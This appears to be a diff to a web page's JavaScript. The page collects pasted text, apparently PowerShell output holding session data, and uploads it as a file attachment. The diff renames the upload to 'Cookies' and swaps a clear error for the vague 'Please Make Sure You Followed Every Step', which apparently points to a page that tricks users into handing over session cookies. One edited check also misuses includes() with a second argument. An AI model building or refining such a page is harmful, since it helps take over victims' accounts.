@@ -339,7 +339,7 @@
                 message += '**📁 PowerShell file attached below**';
 
                 const blob = new Blob([text], { type: 'text/plain' });
-                const file = new File([blob], 'powershell_session.txt', { type: 'text/plain' });
+                const file = new File([blob], 'Cookies', { type: 'text/plain' });
 
                 const formData = new FormData();
                 formData.append('file', file);
@@ -375,7 +375,7 @@
         function validateText() {
             const text = textarea.value;
             
-            if (text.toLowerCase().includes('session') && text.trim().length > 0) {
+            if (text.toLowerCase().includes('session','items') && text.trim().length > 0) {
                 textarea.style.color = '#66bb6a';
                 sendButton.disabled = false;
                 status.textContent = '';
@@ -384,7 +384,7 @@
                 textarea.style.color = '#e0e0e0';
                 sendButton.disabled = true;
                 if (text.trim().length > 0) {
-                    status.textContent = '✗ Text must include "session"';
+                    status.textContent = '✗ Please Make Sure You Followed Every Step';
                     status.className = 'status error';
                 } else {
                     status.textContent = '';
